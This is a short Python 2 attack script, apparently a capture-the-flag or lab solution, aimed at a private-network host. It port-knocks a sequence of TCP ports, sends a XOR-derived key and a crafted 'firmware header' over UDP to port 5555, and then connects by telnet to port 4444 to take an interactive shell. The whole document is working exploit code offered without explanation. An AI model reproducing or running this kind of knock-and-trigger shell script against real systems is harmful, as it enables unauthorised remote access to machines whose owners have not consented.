#!/usr/bin/python

from socket import *
from struct import *
import telnetlib
import time

kr_ports = [1111, 1112, 1113, 1114, 1115]
XORK1=0xdeadb00b
MAGIC1=0x12F9BC11
host="192.168.2.4"
def level1():
    for port in kr_ports:
        print "Knock %d"%(port)
        s = socket(AF_INET,SOCK_STREAM)
        try:
            s.connect((host,port))
        except:
            continue;


def level2():
    s = socket(AF_INET,SOCK_DGRAM)
    key1 = XORK1 ^ MAGIC1
    print "Key1 : ",hex(key1)
    s.sendto(pack("<I",key1),(host,5555))

    
    c = socket(AF_INET,SOCK_DGRAM)
    v0 = 1
    v1 = 2 
    v2 = v0 ^ v1
    
    v3 = 4
    v4 = 5
    v5 = v3 & v4
    v6 = 7
    v7 = 8
    v8 = 9
    v9 = 10
    
    v10 = v5 ^ v2 ^ v6 ^ v7 ^ v8 ^ v9
    val = [v0,v1,v0 ^ v1,
           v3,v4,v5,
           v6,v7,v8,v9,v10]

    fwh = "".join([pack("<I",addr) for addr in val])
    print "sending fw header"
    c.sendto(fwh,(host,5555))

    
if __name__ == "__main__":
    
    level1()
    level2()

    time.sleep(1)
    print "[-] Waiting for shell ...."
    tn = telnetlib.Telnet(host,4444)
    tn.interact()

